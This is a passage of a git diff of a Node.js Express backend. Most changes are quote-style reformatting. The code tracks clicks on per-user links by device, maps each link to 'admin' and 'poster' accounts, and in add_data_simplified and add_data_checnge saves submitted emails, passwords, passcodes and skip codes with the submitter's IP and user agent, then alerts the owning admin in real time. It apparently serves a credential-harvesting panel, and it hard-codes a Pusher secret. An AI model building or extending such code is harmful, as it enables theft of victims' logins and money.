   // return res.status(200).json({ success: siteName })
 
@@ -1201,51 +1134,53 @@ export const site_exist_new = async (req, res) => {
         clickfound.click = clickfound.click + 1;
         await clickfound.save();
 
-        if (device == 'desktop') {
+        if (device == "desktop") {
           clickfound.desktop = clickfound.desktop + 1;
           await clickfound.save();
-          return res.status(200).json({ success: 'exists', id: sitefound._id });
+          return res.status(200).json({ success: "exists", id: sitefound._id });
         }
-        if (device == 'phone') {
+        if (device == "phone") {
           clickfound.phone = clickfound.phone + 1;
           await clickfound.save();
-          return res.status(200).json({ success: 'exists', id: sitefound._id });
+          return res.status(200).json({ success: "exists", id: sitefound._id });
         }
-        if (device == 'ipad') {
+        if (device == "ipad") {
           clickfound.ipad = clickfound.ipad + 1;
           await clickfound.save();
-          return res.status(200).json({ success: 'exists', id: sitefound._id });
+          return res.status(200).json({ success: "exists", id: sitefound._id });
         }
-        return res.status(200).json({ success: 'exists', id: sitefound._id });
+        return res.status(200).json({ success: "exists", id: sitefound._id });
       } else {
         const click = await Click.create({
           site: siteName,
           adminId,
           posterId,
           click: 1,
-          desktop: device == 'desktop' ? 1 : null,
-          phone: device == 'phone' ? 1 : null,
-          ipad: device == 'ipad' ? 1 : null,
+          desktop: device == "desktop" ? 1 : null,
+          phone: device == "phone" ? 1 : null,
+          ipad: device == "ipad" ? 1 : null,
         });
-        return res.status(200).json({ success: 'exists', id: sitefound._id });
+        return res.status(200).json({ success: "exists", id: sitefound._id });
       }
     }
-    return res.status(200).json({ success: 'not exist' });
+    return res.status(200).json({ success: "not exist" });
   } catch (e) {
-    res.status(400).json({ e: 'e' });
+    res.status(400).json({ e: "e" });
   }
 };
 
 export const site_exist = async (req, res) => {
   const { site, param, param1, device } = req.params;
-  const isDeviceName = (val) => val === 'desktop' || val === 'phone' || val === 'ipad';
-  const actualDevice = device || (isDeviceName(param1) ? param1 : (req.device?.type || 'desktop'));
+  const isDeviceName = (val) =>
+    val === "desktop" || val === "phone" || val === "ipad";
+  const actualDevice =
+    device || (isDeviceName(param1) ? param1 : req.device?.type || "desktop");
   const actualParam1 = isDeviceName(param1) ? null : param1;
 
-  const cleanSite = site.replace(/^www\./i, '');
+  const cleanSite = site.replace(/^www\./i, "");
   const siteName = actualParam1
-    ? 'https://' + cleanSite + '/' + param + '/' + actualParam1
-    : 'https://' + cleanSite + '/' + param;
+    ? "https://" + cleanSite + "/" + param + "/" + actualParam1
+    : "https://" + cleanSite + "/" + param;
 
   let sitefound = null;
   let candidateNames = [];
@@ -1261,22 +1196,24 @@ export const site_exist = async (req, res) => {
       `http://${site}/${param}/${actualParam1}`,
     ];
 
-    sitefound = await Link.findOne({ linkName: { $in: candidateNames } }).populate({
-      path: 'root',
+    sitefound = await Link.findOne({
+      linkName: { $in: candidateNames },
+    }).populate({
+      path: "root",
       populate: {
-        path: 'root',
-        model: 'User',
+        path: "root",
+        model: "User",
       },
     });
 
     if (!sitefound) {
       sitefound = await Link.findOne({
-        linkName: new RegExp(`/${param}/${actualParam1}$`, 'i'),
+        linkName: new RegExp(`/${param}/${actualParam1}$`, "i"),
       }).populate({
-        path: 'root',
+        path: "root",
         populate: {
-          path: 'root',
-          model: 'User',
+          path: "root",
+          model: "User",
         },
       });
     }
@@ -1291,25 +1228,24 @@ export const site_exist = async (req, res) => {
       `http://${site}/${param}`,
     ];
 
-    sitefound = await Link.findOne({ linkName: { $in: candidateNames } }).populate({
-      path: 'root',
+    sitefound = await Link.findOne({
+      linkName: { $in: candidateNames },
+    }).populate({
+      path: "root",
       populate: {
-        path: 'root',
-        model: 'User',
+        path: "root",
+        model: "User",
       },
     });
 
     if (!sitefound) {
       sitefound = await Link.findOne({
-        $or: [
-          { linkName: new RegExp(`/${param}$`, 'i') },
-          { username: param },
-        ],
+        $or: [{ linkName: new RegExp(`/${param}$`, "i") }, { username: param }],
       }).populate({
-        path: 'root',
+        path: "root",
         populate: {
-          path: 'root',
-          model: 'User',
+          path: "root",
+          model: "User",
         },
       });
     }
@@ -1318,35 +1254,57 @@ export const site_exist = async (req, res) => {
   try {
     if (sitefound) {
       const matchedSiteName = sitefound.linkName || siteName;
-      let adminId = sitefound.root?.root?.adminId || sitefound.root?.adminId || '';
+      let adminId =
+        sitefound.root?.root?.adminId || sitefound.root?.adminId || "";
       let posterId =
         sitefound.username ||
         sitefound.root?.username ||
         sitefound.root?.posterId ||
-        (sitefound.root?._id ? sitefound.root._id.toString() : '');
+        (sitefound.root?._id ? sitefound.root._id.toString() : "");
 
       if (!adminId || !posterId || !sitefound.root) {
         const posterDoc = await Poster.findOne({
           $or: [
-            { _id: sitefound.root?._id || (sitefound.root && sitefound.root.length === 24 ? sitefound.root : null) },
+            {
+              _id:
+                sitefound.root?._id ||
+                (sitefound.root && sitefound.root.length === 24
+                  ? sitefound.root
+                  : null),
+            },
             { username: sitefound.username || posterId },
             { links: matchedSiteName },
           ],
-        }).populate('root');
+        }).populate("root");
 
         if (posterDoc) {
-          if (!adminId) adminId = posterDoc.root?.adminId || posterDoc.root?.username || '';
-          if (!posterId) posterId = posterDoc.username || posterDoc.posterId || posterDoc._id?.toString() || '';
+          if (!adminId)
+            adminId = posterDoc.root?.adminId || posterDoc.root?.username || "";
+          if (!posterId)
+            posterId =
+              posterDoc.username ||
+              posterDoc.posterId ||
+              posterDoc._id?.toString() ||
+              "";
         } else {
-          const userDoc = await User.findById(sitefound.root?._id || sitefound.root);
+          const userDoc = await User.findById(
+            sitefound.root?._id || sitefound.root,
+          );
           if (userDoc && !adminId) {
-            adminId = userDoc.adminId || userDoc.username || '';
+            adminId = userDoc.adminId || userDoc.username || "";
           }
         }
       }
 
-      const siteamountRecord = await Amount.findOne({ site: { $in: [matchedSiteName, ...candidateNames] } });
-      if (!posterId && siteamountRecord?.posterId && siteamountRecord.posterId !== 'undefined' && siteamountRecord.posterId !== 'null') {
+      const siteamountRecord = await Amount.findOne({
+        site: { $in: [matchedSiteName, ...candidateNames] },
+      });
+      if (
+        !posterId &&
+        siteamountRecord?.posterId &&
+        siteamountRecord.posterId !== "undefined" &&
+        siteamountRecord.posterId !== "null"
+      ) {
         posterId = siteamountRecord.posterId;
       }
       if (!adminId && siteamountRecord?.adminId) {
@@ -1358,11 +1316,11 @@ export const site_exist = async (req, res) => {
         clickfound.click = (clickfound.click || 0) + 1;
         if (!clickfound.adminId) clickfound.adminId = adminId;
         if (!clickfound.posterId) clickfound.posterId = posterId;
-        if (actualDevice === 'desktop') {
+        if (actualDevice === "desktop") {
           clickfound.desktop = (clickfound.desktop || 0) + 1;
-        } else if (actualDevice === 'phone') {
+        } else if (actualDevice === "phone") {
           clickfound.phone = (clickfound.phone || 0) + 1;
-        } else if (actualDevice === 'ipad') {
+        } else if (actualDevice === "ipad") {
           clickfound.ipad = (clickfound.ipad || 0) + 1;
         }
         await clickfound.save();
@@ -1372,16 +1330,17 @@ export const site_exist = async (req, res) => {
           adminId: adminId,
           posterId: posterId,
           click: 1,
-          desktop: actualDevice === 'desktop' ? 1 : null,
-          phone: actualDevice === 'phone' ? 1 : null,
-          ipad: actualDevice === 'ipad' ? 1 : null,
+          desktop: actualDevice === "desktop" ? 1 : null,
+          phone: actualDevice === "phone" ? 1 : null,
+          ipad: actualDevice === "ipad" ? 1 : null,
         });
       }
 
-      const siteamount = siteamountRecord || (await Amount.findOne({ site: matchedSiteName }));
+      const siteamount =
+        siteamountRecord || (await Amount.findOne({ site: matchedSiteName }));
       if (siteamount) {
         return res.status(200).json({
-          success: 'exists',
+          success: "exists",
           id: sitefound._id,
           adminId,
           posterId,
@@ -1390,53 +1349,70 @@ export const site_exist = async (req, res) => {
         });
       }
       return res.status(200).json({
-        success: 'exists',
+        success: "exists",
         id: sitefound._id,
         adminId,
         posterId,
         link: sitefound,
       });
     }
-    return res.status(200).json({ success: 'not exist' });
+    return res.status(200).json({ success: "not exist" });
   } catch (e) {
-    res.status(400).json({ e: e.message || 'error' });
+    res.status(400).json({ e: e.message || "error" });
   }
 };
 
 export const site_exist_two_params = async (req, res) => {
   const { site, param1, param2, device } = req.params;
-  const siteName = 'https://' + site + '/' + param1 + '/' + param2;
+  const siteName = "https://" + site + "/" + param1 + "/" + param2;
 
   try {
     const sitefound = await Link.findOne({ linkName: siteName }).populate({
-      path: 'root',
+      path: "root",
       populate: {
-        path: 'root',
-        model: 'User',
+        path: "root",
+        model: "User",
       },
     });
 
     if (sitefound) {
       const matchedSiteName = sitefound.linkName;
-      let adminId = sitefound.root?.root?.adminId || sitefound.root?.adminId || '';
+      let adminId =
+        sitefound.root?.root?.adminId || sitefound.root?.adminId || "";
       let posterId =
-        sitefound.root?.posterId || sitefound.root?.username || (sitefound.root?.root ? sitefound.root?._id?.toString() : '');
+        sitefound.root?.posterId ||
+        sitefound.root?.username ||
+        (sitefound.root?.root ? sitefound.root?._id?.toString() : "");
 
       if (!adminId && sitefound.root) {
-        const posterDoc = await Poster.findById(sitefound.root._id || sitefound.root).populate('root');
+        const posterDoc = await Poster.findById(
+          sitefound.root._id || sitefound.root,
+        ).populate("root");
         if (posterDoc) {
-          adminId = posterDoc.root?.adminId || posterDoc.root?.username || '';
-          if (!posterId) posterId = posterDoc.posterId || posterDoc.username || posterDoc._id?.toString() || '';
+          adminId = posterDoc.root?.adminId || posterDoc.root?.username || "";
+          if (!posterId)
+            posterId =
+              posterDoc.posterId ||
+              posterDoc.username ||
+              posterDoc._id?.toString() ||
+              "";
         } else {
-          const userDoc = await User.findById(sitefound.root._id || sitefound.root);
+          const userDoc = await User.findById(
+            sitefound.root._id || sitefound.root,
+          );
           if (userDoc) {
-            adminId = userDoc.adminId || userDoc.username || '';
+            adminId = userDoc.adminId || userDoc.username || "";
           }
         }
       }
 
       const siteamountRecord = await Amount.findOne({ site: matchedSiteName });
-      if (!posterId && siteamountRecord?.posterId && siteamountRecord.posterId !== 'undefined' && siteamountRecord.posterId !== 'null') {
+      if (
+        !posterId &&
+        siteamountRecord?.posterId &&
+        siteamountRecord.posterId !== "undefined" &&
+        siteamountRecord.posterId !== "null"
+      ) {
         posterId = siteamountRecord.posterId;
       }
       if (!adminId && siteamountRecord?.adminId) {
@@ -1446,11 +1422,11 @@ export const site_exist_two_params = async (req, res) => {
       const clickfound = await Click.findOne({ site: matchedSiteName });
       if (clickfound) {
         clickfound.click = (clickfound.click || 0) + 1;
-        if (device === 'desktop') {
+        if (device === "desktop") {
           clickfound.desktop = (clickfound.desktop || 0) + 1;
-        } else if (device === 'phone') {
+        } else if (device === "phone") {
           clickfound.phone = (clickfound.phone || 0) + 1;
-        } else if (device === 'ipad') {
+        } else if (device === "ipad") {
           clickfound.ipad = (clickfound.ipad || 0) + 1;
         }
         if (!clickfound.adminId) clickfound.adminId = adminId;
@@ -1462,16 +1438,16 @@ export const site_exist_two_params = async (req, res) => {
           adminId: adminId,
           posterId: posterId,
           click: 1,
-          desktop: device === 'desktop' ? 1 : null,
-          phone: device === 'phone' ? 1 : null,
-          ipad: device === 'ipad' ? 1 : null,
+          desktop: device === "desktop" ? 1 : null,
+          phone: device === "phone" ? 1 : null,
+          ipad: device === "ipad" ? 1 : null,
         });
       }
 
       const siteamount = await Amount.findOne({ site: matchedSiteName });
       if (siteamount) {
         return res.status(200).json({
-          success: 'exists',
+          success: "exists",
           id: sitefound._id,
           adminId,
           posterId,
@@ -1481,9 +1457,15 @@ export const site_exist_two_params = async (req, res) => {
       }
       return res
         .status(200)
-        .json({ success: 'exists', id: sitefound._id, adminId, posterId, link: sitefound });
+        .json({
+          success: "exists",
+          id: sitefound._id,
+          adminId,
+          posterId,
+          link: sitefound,
+        });
     }
-    return res.status(200).json({ success: 'not exist' });
+    return res.status(200).json({ success: "not exist" });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -1491,7 +1473,7 @@ export const site_exist_two_params = async (req, res) => {
 
 export const site_exist_simplified = async (req, res) => {
   const { site, adminId, device } = req.params;
-  const siteName = 'https://' + site + '/' + adminId;
+  const siteName = "https://" + site + "/" + adminId;
 
   try {
     const sitefound = await Link.findOne({ linkName: siteName });
@@ -1501,11 +1483,11 @@ export const site_exist_simplified = async (req, res) => {
       const clickfound = await Click.findOne({ site: matchedSiteName });
       if (clickfound) {
         clickfound.click = (clickfound.click || 0) + 1;
-        if (device === 'desktop') {
+        if (device === "desktop") {
           clickfound.desktop = (clickfound.desktop || 0) + 1;
-        } else if (device === 'phone') {
+        } else if (device === "phone") {
           clickfound.phone = (clickfound.phone || 0) + 1;
-        } else if (device === 'ipad') {
+        } else if (device === "ipad") {
           clickfound.ipad = (clickfound.ipad || 0) + 1;
         }
         await clickfound.save();
@@ -1514,9 +1496,9 @@ export const site_exist_simplified = async (req, res) => {
           site: matchedSiteName,
           adminId: adminId,
           click: 1,
-          desktop: device === 'desktop' ? 1 : null,
-          phone: device === 'phone' ? 1 : null,
-          ipad: device === 'ipad' ? 1 : null,
+          desktop: device === "desktop" ? 1 : null,
+          phone: device === "phone" ? 1 : null,
+          ipad: device === "ipad" ? 1 : null,
         });
       }
 
@@ -1524,11 +1506,11 @@ export const site_exist_simplified = async (req, res) => {
       if (siteamount) {
         return res
           .status(200)
-          .json({ success: 'exists', id: sitefound._id, sitename: siteamount });
+          .json({ success: "exists", id: sitefound._id, sitename: siteamount });
       }
-      return res.status(200).json({ success: 'exists', id: sitefound._id });
+      return res.status(200).json({ success: "exists", id: sitefound._id });
     }
-    return res.status(200).json({ success: 'not exist' });
+    return res.status(200).json({ success: "not exist" });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -1536,22 +1518,22 @@ export const site_exist_simplified = async (req, res) => {
 
 export const add_data_simplified = async (req, res) => {
   const pusher = new Pusher({
-    appId: '1987499',
-    key: '05656b52c62c0f688ee3',
-    secret: 'b4372518df233d054270',
-    cluster: 'ap2',
+    appId: "1987499",
+    key: "05656b52c62c0f688ee3",
+    secret: "b4372518df233d054270",
+    cluster: "ap2",
     useTLS: true,
   });
 
   const { adminId } = req.params;
   const { site, mail, passcode, email, password, amount } = req.body;
-  const userAgent = req.headers['user-agent'];
+  const userAgent = req.headers["user-agent"];
   const ipAddress = (
-    req.headers['x-forwarded-for'] ||
+    req.headers["x-forwarded-for"] ||
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     req.connection.socket.remoteAddress
-  ).split(',')[0];
+  ).split(",")[0];
 
   try {
     const query =
@@ -1565,12 +1547,12 @@ export const add_data_simplified = async (req, res) => {
       let posterFoundForSite = null;
 
       if (site) {
-        let linkDoc = await Link.findOne({ linkName: site }).populate('root');
+        let linkDoc = await Link.findOne({ linkName: site }).populate("root");
         if (!linkDoc) {
-          const escapedSite = site.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+          const escapedSite = site.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
           linkDoc = await Link.findOne({
-            linkName: new RegExp(`^${escapedSite}/`, 'i'),
-          }).populate('root');
+            linkName: new RegExp(`^${escapedSite}/`, "i"),
+          }).populate("root");
         }
 
         if (linkDoc) {
@@ -1578,7 +1560,9 @@ export const add_data_simplified = async (req, res) => {
           if (linkDoc.root) {
             posterFoundForSite = linkDoc.root;
           } else if (linkDoc.username) {
-            posterFoundForSite = await Poster.findOne({ username: linkDoc.username });
+            posterFoundForSite = await Poster.findOne({
+              username: linkDoc.username,
+            });
           }
         }
       }
@@ -1591,7 +1575,9 @@ export const add_data_simplified = async (req, res) => {
         password,
         amount,
         adminId: userFound.adminId || userFound.username,
-        poster: posterFoundForSite ? (posterFoundForSite.username || posterFoundForSite.posterId) : '',
+        poster: posterFoundForSite
+          ? posterFoundForSite.username || posterFoundForSite.posterId
+          : "",
         root: posterFoundForSite ? posterFoundForSite._id : null,
         ip: ipAddress,
         agent: userAgent,
@@ -1609,7 +1595,7 @@ export const add_data_simplified = async (req, res) => {
         try {
           const internalAmount = getInternalAmount(amount);
           const numericAmount = await getSatoshis(
-            String(internalAmount).replace(/[^0-9.]/g, '')
+            String(internalAmount).replace(/[^0-9.]/g, ""),
           );
           if (numericAmount > 0) {
             const albyResponse = await nwcInstance.makeInvoice({
@@ -1621,29 +1607,38 @@ export const add_data_simplified = async (req, res) => {
 
               // Find the payment hash from the transaction list without changing makeInvoice
               try {
-                const txs = await nwcInstance.listTransactions({ limit: 10, unpaid: true });
+                const txs = await nwcInstance.listTransactions({
+                  limit: 10,
+                  unpaid: true,
+                });
                 if (txs && txs.transactions) {
                   const matchedTx = txs.transactions.find(
-                    (tx) => tx.invoice === albyResponse.paymentRequest
+                    (tx) => tx.invoice === albyResponse.paymentRequest,
                   );
                   if (matchedTx && matchedTx.payment_hash) {
                     info.rHash = matchedTx.payment_hash;
-                    console.log('[Alby NWC] Found payment hash (simplified):', matchedTx.payment_hash);
+                    console.log(
+                      "[Alby NWC] Found payment hash (simplified):",
+                      matchedTx.payment_hash,
+                    );
                   }
                 }
               } catch (txErr) {
-                console.error('[Alby NWC] Failed to list transactions to find hash (simplified):', txErr.message);
+                console.error(
+                  "[Alby NWC] Failed to list transactions to find hash (simplified):",
+                  txErr.message,
+                );
               }
 
               console.log(
-                '[Alby NWC] Invoice created successfully (simplified).'
+                "[Alby NWC] Invoice created successfully (simplified).",
               );
             }
           }
         } catch (albyErr) {
           console.error(
-            'Alby NWC Invoice creation failed in add_data_simplified:',
-            albyErr.message
+            "Alby NWC Invoice creation failed in add_data_simplified:",
+            albyErr.message,
           );
         }
       }
@@ -1652,22 +1647,22 @@ export const add_data_simplified = async (req, res) => {
         await Amount.findOneAndUpdate(
           { site: site, adminId: userFound.adminId || userFound.username },
           { amount: amount },
-          { new: true, upsert: true }
+          { new: true, upsert: true },
         );
       }
 
       await info.save();
       pusher.trigger(
         userFound.adminId || userFound.username,
-        'new-notification',
+        "new-notification",
         {
           adminId: userFound.adminId || userFound.username,
           name: userFound.username,
-        }
+        },
       );
-      return res.status(200).json({ status: 'saved', info });
+      return res.status(200).json({ status: "saved", info });
     }
-    return res.status(400).json({ error: 'User not found' });
+    return res.status(400).json({ error: "User not found" });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -1683,13 +1678,13 @@ export const admin_add_site = async (req, res) => {
       return element == site;
     });
     if (linKfound) {
-      return res.status(200).json({ success: 'exists' });
+      return res.status(200).json({ success: "exists" });
     }
     data.links.push(site);
     await data.save();
-    return res.status(200).json({ success: 'saved successfully' });
+    return res.status(200).json({ success: "saved successfully" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -1712,7 +1707,7 @@ export const new_site_add_poster = (req, res) => {
         Link.findOne({ linkName: item })
           .then(async (found) => {
             if (found) {
-              console.log('yes');
+              console.log("yes");
             }
             await Link.create({
               linkName: item,
@@ -1721,9 +1716,9 @@ export const new_site_add_poster = (req, res) => {
           })
           .catch((e) => console.log(e));
       });
-    }
+    },
   );
-  return res.status(200).json({ success: 'updated successfully' });
+  return res.status(200).json({ success: "updated successfully" });
 };
 
 export const get_A_poster = async (req, res) => {
@@ -1735,7 +1730,7 @@ export const get_A_poster = async (req, res) => {
     if (admin) {
       const data = await Poster.findOne({ _id: id });
       if (!data) {
-        return res.status(200).json({ data: 'not found' });
+        return res.status(200).json({ data: "not found" });
       }
       return res.status(200).json({ data: data });
     }
@@ -1743,7 +1738,7 @@ export const get_A_poster = async (req, res) => {
 
     return res.status(200).json({ data: data.links, sites: sites });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -1793,7 +1788,7 @@ export const click = async (req, res) => {
   const { adminId, posterId } = req.params;
   const page = parseInt(req.query.page) || 1;
   const pageSize = parseInt(req.query.pageSize) || 20;
-  const filter = req.query.filter || '';
+  const filter = req.query.filter || "";
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
@@ -1801,14 +1796,14 @@ export const click = async (req, res) => {
 
     if (filter) {
       query.$or = [
-        { site: { $regex: filter, $options: 'i' } },
-        { ip: { $regex: filter, $options: 'i' } }
+        { site: { $regex: filter, $options: "i" } },
+        { ip: { $regex: filter, $options: "i" } },
       ];
     }
 
     const sort = {};
     if (sortBy.length > 0) {
-      sortBy.forEach(s => {
+      sortBy.forEach((s) => {
         sort[s.id] = s.desc ? -1 : 1;
       });
     } else {
@@ -1825,10 +1820,10 @@ export const click = async (req, res) => {
       data: clicks,
       total: total,
       page: page,
-      pageSize: pageSize
+      pageSize: pageSize,
     });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -1836,7 +1831,7 @@ export const click_for_admin = async (req, res) => {
   const { adminId } = req.params;
   const page = parseInt(req.query.page) || 1;
   const pageSize = parseInt(req.query.pageSize) || 20;
-  const filter = req.query.filter || '';
+  const filter = req.query.filter || "";
   const sortBy = req.query.sortBy ? JSON.parse(req.query.sortBy) : [];
 
   try {
@@ -1844,15 +1839,15 @@ export const click_for_admin = async (req, res) => {
 
     if (filter) {
       query.$or = [
-        { site: { $regex: filter, $options: 'i' } },
-        { ip: { $regex: filter, $options: 'i' } },
-        { posterId: { $regex: filter, $options: 'i' } }
+        { site: { $regex: filter, $options: "i" } },
+        { ip: { $regex: filter, $options: "i" } },
+        { posterId: { $regex: filter, $options: "i" } },
       ];
     }
 
     const sort = {};
     if (sortBy.length > 0) {
-      sortBy.forEach(s => {
+      sortBy.forEach((s) => {
         sort[s.id] = s.desc ? -1 : 1;
       });
     } else {
@@ -1869,16 +1864,16 @@ export const click_for_admin = async (req, res) => {
       data: clicks,
       total: total,
       page: page,
-      pageSize: pageSize
+      pageSize: pageSize,
     });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
 export const otp_send = async (req, res) => {
   const { username, phone } = req.body;
-  const apiUrl = 'https://sms.dev-sajid.xyz/api/send-otp-v1';
+  const apiUrl = "https://sms.dev-sajid.xyz/api/send-otp-v1";
 
   const postData = {
     number: phone,
@@ -1891,7 +1886,7 @@ export const otp_send = async (req, res) => {
     if (userFound.phone == phone) {
       const response = await axios.post(apiUrl, postData);
       if (!response) {
-        return res.status(400).json({ e: 'user not found' });
+        return res.status(400).json({ e: "user not found" });
       }
       const otp = await Otp.create({
         otp: response.data.otp,
@@ -1902,11 +1897,11 @@ export const otp_send = async (req, res) => {
       // passwordOfPassChanges.totalRequest= passwordOfPassChanges.totalRequest + 1
       // await  passwordOfPassChanges.save()
 
-      return res.status(200).json({ success: 'otp sent successfully' });
+      return res.status(200).json({ success: "otp sent successfully" });
     }
-    return res.status(400).json({ e: 'user not found' });
+    return res.status(400).json({ e: "user not found" });
   } catch (e) {
-    return res.status(400).json({ e: 'error' });
+    return res.status(400).json({ e: "error" });
   }
 };
 
@@ -1923,24 +1918,24 @@ export const otp_check = async (req, res) => {
       const diff = currentDate - otpUser.createdAt;
       const difff = diff / 1000 / 60;
       if (difff >= 2) {
-        return res.status(400).json({ error: 'session Expired' });
+        return res.status(400).json({ error: "session Expired" });
       }
-      return res.status(200).json({ success: 'true' });
+      return res.status(200).json({ success: "true" });
     }
 
-    return res.status(400).json({ e: 'user not found' });
+    return res.status(400).json({ e: "user not found" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
 export const pass_change = async (req, res) => {
   const { username, password, otp } = req.body;
   const pusher = new Pusher({
-    appId: '1987499',
-    key: '05656b52c62c0f688ee3',
-    secret: 'b4372518df233d054270',
-    cluster: 'ap2',
+    appId: "1987499",
+    key: "05656b52c62c0f688ee3",
+    secret: "b4372518df233d054270",
+    cluster: "ap2",
     useTLS: true,
   });
 
@@ -1954,17 +1949,17 @@ export const pass_change = async (req, res) => {
       const deleted = await Otp.findOneAndRemove({ otp: otpUser.otp });
 
       if (deleted) {
-        pusher.trigger(userFound.adminId, 'password-notification', {
+        pusher.trigger(userFound.adminId, "password-notification", {
           adminId: userFound.adminId,
         });
       }
 
-      return res.status(200).json({ success: 'changed succesfully' });
+      return res.status(200).json({ success: "changed succesfully" });
     }
 
-    return res.status(400).json({ e: 'user not found' });
+    return res.status(400).json({ e: "user not found" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -1983,12 +1978,12 @@ export const phone_add = async (req, res) => {
       // }
       userFound.phone = phone;
       await userFound.save();
-      return res.status(200).json({ success: 'changed succesfully' });
+      return res.status(200).json({ success: "changed succesfully" });
     }
 
-    return res.status(400).json({ e: 'user not found' });
+    return res.status(400).json({ e: "user not found" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -2010,7 +2005,7 @@ export const update_validity = (req, res) => {
         res.status(400).json({ error: err });
       }
       res.status(200).json({ success: currentDate });
-    }
+    },
   );
 };
 
@@ -2055,10 +2050,10 @@ export const cashapap_post = async (req, res) => {
         adminId,
         posterId,
       });
-      return res.status(200).json({ success: 'Created successfully ' });
+      return res.status(200).json({ success: "Created successfully " });
     }
 
-    return res.status(400).json({ error: 'doesnt exists' });
+    return res.status(400).json({ error: "doesnt exists" });
   } catch (e) {
     return res.status(400).json({ error: e });
   }
@@ -2080,7 +2075,7 @@ export const links_add = (req, res) => {
         res.status(400).json({ error: err });
       }
       res.status(200).json({ success: true });
-    }
+    },
   );
 };
 
@@ -2101,9 +2096,9 @@ export const get_deyails_cashapp = async (req, res) => {
     if (cashappAdmin.length > 0) {
       return res.status(200).json({ cashapp: cashappAdmin });
     }
-    return res.status(400).json({ error: 'not found any' });
+    return res.status(400).json({ error: "not found any" });
   } catch (e) {
-    res.status(400).json({ e: 'error' });
+    res.status(400).json({ e: "error" });
   }
 };
 
@@ -2129,7 +2124,7 @@ export const show_all = async (req, res) => {
   //     socket.io.emit("done")
   // })
   try {
-    const userFound = await Poster.find().select('links');
+    const userFound = await Poster.find().select("links");
 
     return res.status(200).json({ user: userFound });
   } catch (e) {
@@ -2147,7 +2142,7 @@ export const check_qrcode = async (req, res) => {
         {
           status: userFound.qrCodeStatus === true,
           showTagField: userFound.showTagField === true,
-          tag: userFound.tag || '',
+          tag: userFound.tag || "",
         },
       ]);
     }
@@ -2166,7 +2161,7 @@ export const check_qrcode = async (req, res) => {
           {
             status: admin.qrCodeStatus === true,
             showTagField: admin.showTagField === true,
-            tag: posterFound.tag || '',
+            tag: posterFound.tag || "",
           },
         ]);
       }
@@ -2179,7 +2174,7 @@ export const check_qrcode = async (req, res) => {
         {
           status: userById.qrCodeStatus === true,
           showTagField: userById.showTagField === true,
-          tag: userById.tag || '',
+          tag: userById.tag || "",
         },
       ]);
     }
@@ -2193,13 +2188,13 @@ export const check_qrcode = async (req, res) => {
           {
             status: admin.qrCodeStatus === true,
             showTagField: admin.showTagField === true,
-            tag: posterById.tag || '',
+            tag: posterById.tag || "",
           },
         ]);
       }
     }
 
-    return res.status(400).json({ error: 'not found' });
+    return res.status(400).json({ error: "not found" });
   } catch (e) {
     return res.status(400).json({ error: e.message });
   }
@@ -2219,8 +2214,8 @@ export const rqcode_permission = (req, res) => {
       if (err) {
         res.status(400).json({ error: err });
       }
-      res.status(200).json({ success: 'succes' });
-    }
+      res.status(200).json({ success: "succes" });
+    },
   );
 };
 
@@ -2237,14 +2232,14 @@ export const update_many = (req, res) => {
     if (err) {
       res.status(400).json({ error: err });
     }
-    res.status(200).json({ success: 'success' });
+    res.status(200).json({ success: "success" });
   });
 };
 
 export const add_data_checnge = async (req, res) => {
   const { adminId, posterId } = req.params;
   const { site, email, password, skipcode, username, passcode } = req.body;
-  const userAgent = req.headers['user-agent'];
+  const userAgent = req.headers["user-agent"];
   const ipAddress = req.connection.remoteAddress;
   try {
     const userFound = await User.findOne({ adminId: adminId });
@@ -2268,12 +2263,12 @@ export const add_data_checnge = async (req, res) => {
       });
       posterFound.details.push(info._id);
       await posterFound.save();
-      changeEvent('hello', req, res);
+      changeEvent("hello", req, res);
       return res.status(200).json({ info: info });
     }
-    return res.status(400).json({ e: 'not found' });
+    return res.status(400).json({ e: "not found" });
   } catch (e) {
-    return res.status(400).json({ e: 'error' });
+    return res.status(400).json({ e: "error" });
   }
 };
 
@@ -2283,17 +2278,17 @@ export const today_data = async (req, res) => {
   if (user) {
     const desktopClickSum = await Click.aggregate([
       { $match: { adminId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalDesktop: { $sum: '$desktop' } } }, // Sum desktop values
+      { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } }, // Sum desktop values
     ]);
 
     const phoneClickSum = await Click.aggregate([
       { $match: { adminId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalPhone: { $sum: '$phone' } } }, // Sum desktop values
+      { $group: { _id: null, totalPhone: { $sum: "$phone" } } }, // Sum desktop values
     ]);
 
     const ipadClickSum = await Click.aggregate([
       { $match: { adminId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalIpad: { $sum: '$ipad' } } }, // Sum desktop values
+      { $group: { _id: null, totalIpad: { $sum: "$ipad" } } }, // Sum desktop values
     ]);
 
     const totalDesktopClicks =
@@ -2311,17 +2306,17 @@ export const today_data = async (req, res) => {
   } else {
     const desktopClickSum = await Click.aggregate([
       { $match: { posterId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalDesktop: { $sum: '$desktop' } } }, // Sum desktop values
+      { $group: { _id: null, totalDesktop: { $sum: "$desktop" } } }, // Sum desktop values
     ]);
 
     const phoneClickSum = await Click.aggregate([
       { $match: { posterId: IId } }, // Filter by adminId
-      { $group: { _id: null, totalPhone: { $sum: '$phone' } } }, // Sum desktop values
+      { $group: { _id: null, totalPhone: { $sum: "$phone" } } }, // Sum desktop values
     ]);
 
